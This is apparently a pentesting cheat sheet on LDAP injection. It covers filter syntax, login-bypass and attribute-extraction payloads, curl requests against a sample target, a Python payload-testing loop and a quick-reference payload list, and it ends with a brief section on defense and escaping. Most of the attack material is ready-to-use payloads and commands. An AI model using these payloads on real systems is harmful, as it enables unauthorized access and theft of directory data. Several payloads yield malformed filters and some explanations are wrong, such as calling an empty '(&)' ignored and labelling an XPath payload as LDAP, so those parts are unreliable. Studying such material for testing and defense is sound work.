# LDAP Injection

## LDAP Injection

### Overview

**LDAP Injection** is a web security vulnerability that occurs when user input is incorporated into LDAP queries without proper sanitization. Similar to SQL injection, attackers can manipulate LDAP queries to bypass authentication, extract sensitive information, or gain unauthorized access.

**What is LDAP?** LDAP (Lightweight Directory Access Protocol) is used to access and manage directory information services. Common implementations include:

* Active Directory (Microsoft)
* OpenLDAP
* Apache Directory Server

**Where it's used:**

* Authentication systems
* Corporate directories
* User management portals
* Email systems
* VPN authentication

**Impact of successful exploitation:**

* Authentication bypass
* Unauthorized data access
* Information disclosure (users, emails, groups)
* Privilege escalation
* Complete directory enumeration

***

### Exploitation Workflow Summary

```
1. Discovery & Identification
   ├─ Identify LDAP-based authentication
   ├─ Locate input fields interacting with LDAP
   ├─ Test for injection vulnerability
   └─ Determine LDAP server type

2. Basic Injection Testing
   ├─ Wildcard injection (*)
   ├─ Boolean-based blind injection
   ├─ Error-based injection
   └─ Filter manipulation

3. Authentication Bypass
   ├─ Always-true conditions
   ├─ Comment injection
   ├─ Null byte injection
   └─ Logical operator abuse

4. Information Extraction
   ├─ User enumeration
   ├─ Attribute extraction
   ├─ Group membership discovery
   └─ Directory structure mapping

5. Advanced Exploitation
   ├─ Blind LDAP injection
   ├─ Time-based detection
   ├─ Second-order injection
   └─ Privilege escalation
```

***

### Understanding LDAP Queries

#### LDAP Filter Syntax

**Basic structure:**

```ldap
(attribute=value)
```

**Examples:**

```ldap
# Find user "john"
(cn=john)

# Find all users starting with "j"
(cn=j*)

# Find users in specific group
(memberOf=CN=Admins,DC=company,DC=com)
```

#### Logical Operators

**AND operator (`&`):**

```ldap
(&(cn=john)(objectClass=user))
# Both conditions must be true
```

**OR operator (`|`):**

```ldap
(|(cn=john)(cn=jane))
# Either condition can be true
```

**NOT operator (`!`):**

```ldap
(!(cn=john))
# Negates the condition
```

#### Wildcards

**Asterisk (`*`) - matches any characters:**

```ldap
# Names starting with "s"
(cn=s*)

# Names ending with "n"
(cn=*n)

# Names containing "oh"
(cn=*oh*)

# Match anything
(cn=*)
```

***

### Vulnerable Application Examples

#### Login Form Scenario

**Backend LDAP query:**

```php
$filter = "(&(uid=$username)(userPassword=$password))";
```

**Normal query:**

```ldap
(&(uid=john)(userPassword=secret123))
```

**Injected query:**

```ldap
# Input: username=admin*)(&  password=anything
(&(uid=admin*)(&)(userPassword=anything))
# First filter matches "admin*" (any admin)
# Second empty filter is ignored
# Password check effectively bypassed
```

#### Search Form Scenario

**Backend query:**

```php
$filter = "(cn=$searchterm)";
```

**Normal query:**

```ldap
(cn=John Smith)
```

**Injected query:**

```ldap
# Input: *)(objectClass=*)
(cn=*)(objectClass=*)
# Returns all objects in directory
```

***

### Basic Injection Payloads

#### Wildcard Injection

**Purpose:** Match any value, bypass filters

**Simple wildcard:**

```
*
```

**Usage in login:**

```
username: *
password: *
```

**Resulting query:**

```ldap
(&(uid=*)(userPassword=*))
# Matches any user with any password
```

**Wildcard with prefix:**

```
admin*
```

**Resulting query:**

```ldap
(uid=admin*)
# Matches admin, administrator, admin-user, etc.
```

#### Boolean-Based Injection

**Always-true conditions:**

**Payload 1:**

```
*)(objectClass=*)
```

**How it works:**

```ldap
# Original: (cn=$input)
# Injected: (cn=*)(objectClass=*)
# Result: First filter matches all, second is always true
```

**Payload 2:**

```
*)(|(objectClass=*))
```

**How it works:**

```ldap
(cn=*)(|(objectClass=*))
# Matches everything, OR with always-true condition
```

#### Comment/Termination Injection

**Null byte termination:**

```
admin*)%00
```

**How it works:**

```ldap
(&(uid=admin*)%00)(userPassword=anything))
# Everything after %00 is ignored
# Only checks for uid=admin*
```

**Alternative null byte:**

```
admin*))%00
```

***

### Authentication Bypass Techniques

#### Method 1: Filter Closure Bypass

**Payload:**

```
*)(&
```

**Original query:**

```ldap
(&(uid=INPUT)(userPassword=PASSWORD))
```

**Injected query:**

```ldap
(&(uid=*)(&)(userPassword=anything))
```

**What happens:**

1. `uid=*` matches all users
2. Empty `(&)` filter is ignored
3. Password check becomes irrelevant

#### Method 2: OR Injection

**Payload:**

```
*)(|(uid=*))
```

**Injected query:**

```ldap
(&(uid=*)(|(uid=*)))(userPassword=anything))
```

**What happens:**

1. First `uid=*` matches all
2. OR condition is always true
3. Authentication bypassed

#### Method 3: Administrative User Targeting

**Payload:**

```
admin*)((|userPassword=*)
```

**Injected query:**

```ldap
(&(uid=admin*)((|userPassword=*))(userPassword=INPUT))
```

**What happens:**

1. Matches usernames starting with "admin"
2. OR condition makes password check always true

#### Method 4: Attribute Manipulation

**Payload:**

```
*)(cn=*))(&(cn=*
```

**Complex injection creating valid LDAP syntax while bypassing intended logic.**

***

### Information Extraction

#### User Enumeration

**Test for user existence:**

**Payload for valid user:**

```
username: john*)(uid=john
password: anything
```

**Expected behavior:**

* If "john" exists: Different response (login attempt, delay)
* If "john" doesn't exist: Error or immediate rejection

**Enumerate users starting with 'a':**

```
a*
```

**Enumerate pattern:**

```bash
# Test each letter
for letter in {a..z}; do
    echo "Testing: ${letter}*"
    # Send request with username=${letter}*
done
```

#### Attribute Extraction

**Extract email addresses:**

```
*)(mail=*)
```

**Extract phone numbers:**

```
*)(telephoneNumber=*)
```

**Extract group memberships:**

```
*)(memberOf=*)
```

#### Blind LDAP Injection

**When no direct output is visible, use boolean conditions:**

**Test if user starts with 'a':**

```
username: a*
# Observe response time/behavior difference
```

**Test if attribute exists:**

```
*)(mail=*))(&(cn=test
# If mail attribute exists, different behavior
```

***

### Advanced Payloads

#### XPath-Style Injection

**Payload:**

```
x' or name()='username' or 'x'='y
```

**Context:** Some LDAP implementations parse input differently

#### Nested Filter Injection

**Payload:**

```
*)(uid=*))(|(uid=*
```

**Creates complex nested filters to confuse parser**

#### Multi-Level Bypass

**Payload:**

```
admin*)((|userPassword=*)
```

**Targets both username and password validation simultaneously**

#### Directory Traversal

**Payload:**

```
*/*
//
//*
```

**Attempts to navigate directory structure**

***

### Testing Methodology

#### Step 1: Identify LDAP Functionality

**Look for:**

* Login forms
* Search functionality
* User directories
* "Forgot password" features
* Address books
* Email lookup tools

**Common indicators:**

```
Login form with:
- Username field
- Password field
- Domain selection
- "Search in directory" option
```

#### Step 2: Test for Injection

**Basic test payloads:**

```
Input: *
Expected: Return all results or error

Input: *)(&
Expected: Authentication bypass or error

Input: admin*
Expected: Match admin users
```

**Example test sequence:**

```bash
# Test 1: Single asterisk
username=*&password=*

# Test 2: Filter closure
username=*)(&password=anything

# Test 3: OR injection
username=*)(|(uid=*)password=test

# Test 4: Null byte
username=admin*)%00&password=ignored
```

#### Step 3: Analyze Responses

**Response indicators:**

| Response                | Meaning                   |
| ----------------------- | ------------------------- |
| Different error message | Injection point confirmed |
| Successful login        | Authentication bypassed   |
| Increased response time | Potential blind injection |
| Empty results           | Filter syntax error       |
| All results returned    | Wildcard worked           |

#### Step 4: Refine Exploitation

**Once injection confirmed:**

1. Identify valid user formats
2. Test different logical operators
3. Enumerate attributes
4. Extract information systematically

***

### Real-World Examples

#### Example 1: Login Form Bypass

**Application:** Corporate intranet login

**Original query:**

```ldap
(&(uid={username})(userPassword={password}))
```

**Attack:**

```
Username: admin*)(&
Password: anything
```

**Resulting query:**

```ldap
(&(uid=admin*)(&)(userPassword=anything))
```

**Result:** Logged in as admin

#### Example 2: User Search Bypass

**Application:** Employee directory search

**Original query:**

```ldap
(cn=*{searchterm}*)
```

**Attack:**

```
Search: *)(mail=*)
```

**Resulting query:**

```ldap
(cn=**)(mail=*)
```

**Result:** Retrieved all email addresses

#### Example 3: VPN Authentication Bypass

**Application:** Corporate VPN login

**Original query:**

```ldap
(&(samAccountName={username})(objectClass=user))
```

**Attack:**

```
Username: *)(objectClass=*))(|(objectClass=*
```

**Resulting query:**

```ldap
(&(samAccountName=*)(objectClass=*))(|(objectClass=*)(objectClass=user))
```

**Result:** Authentication bypassed

***

### Detection and Testing Tools

#### Manual Testing

**Burp Suite:**

```
1. Intercept login request
2. Send to Repeater
3. Test payloads in username/password fields
4. Observe response differences
```

**cURL examples:**

```bash
# Test wildcard
curl -X POST http://target.com/login \
  -d "username=*&password=*"

# Test injection
curl -X POST http://target.com/login \
  -d "username=admin*)(&password=test"

# Test with URL encoding
curl -X POST http://target.com/login \
  -d "username=admin%2A%29%28%26&password=test"
```

#### Automated Tools

**ldapinjection (Python script concept):**

```python
payloads = [
    "*",
    "*)(&",
    "*)(|(objectClass=*))",
    "admin*",
    "admin*)((|userPassword=*)"
]

for payload in payloads:
    response = login(username=payload, password="test")
    if response.status_code == 200:
        print(f"Potential bypass with: {payload}")
```

***

### Common LDAP Filters Reference

#### User Searches

```ldap
# Find specific user
(cn=John Smith)

# Find users starting with "J"
(cn=J*)

# Find users with email
(mail=*)

# Find users in group
(memberOf=CN=Admins,DC=company,DC=com)
```

#### Authentication Queries

```ldap
# Standard authentication
(&(uid=username)(userPassword=password))

# With object class
(&(uid=username)(objectClass=person)(userPassword=password))

# With group membership
(&(uid=username)(memberOf=CN=Users)(userPassword=password))
```

#### Complex Searches

```ldap
# Multiple conditions (AND)
(&(cn=John)(objectClass=user)(mail=*@company.com))

# Multiple conditions (OR)
(|(cn=John)(cn=Jane)(cn=Bob))

# NOT condition
(!(cn=John))

# Nested conditions
(&(|(cn=John)(cn=Jane))(objectClass=user))
```

***

### Defense & Prevention

**Input Validation:**

* Whitelist allowed characters
* Reject special LDAP characters: `* ( ) \ | & !`
* Validate input length
* Use prepared statements/parameterized queries

**Proper Escaping:**

```
Characters to escape:
* → \2a
( → \28
) → \29
\ → \5c
| → \7c
& → \26
NUL → \00
```

**Secure Coding Practices:**

* Use LDAP libraries with built-in sanitization
* Implement least privilege (bind with limited permissions)
* Avoid dynamic filter construction
* Use allow-lists for search attributes

**Application Security:**

* Implement rate limiting
* Add CAPTCHA for authentication
* Monitor for injection patterns
* Log LDAP queries for analysis
* Implement account lockout policies

***

### Quick Reference

#### Common Payloads

```
# Authentication bypass
*
*)(&
*)(objectClass=*)
admin*)((|userPassword=*)

# Information extraction
*)(mail=*)
*)(telephoneNumber=*)
*)(memberOf=*)

# Null byte injection
admin*)%00
*)%00

# Complex injection
*)(uid=*))(|(uid=*
x' or name()='username' or 'x'='y
```

#### Test Sequence

```bash
# 1. Test wildcard
username=*&password=*

# 2. Test filter closure
username=*)(&password=test

# 3. Test OR injection
username=*)(|(uid=*)&password=test

# 4. Test admin targeting
username=admin*)((|userPassword=*)&password=test
```

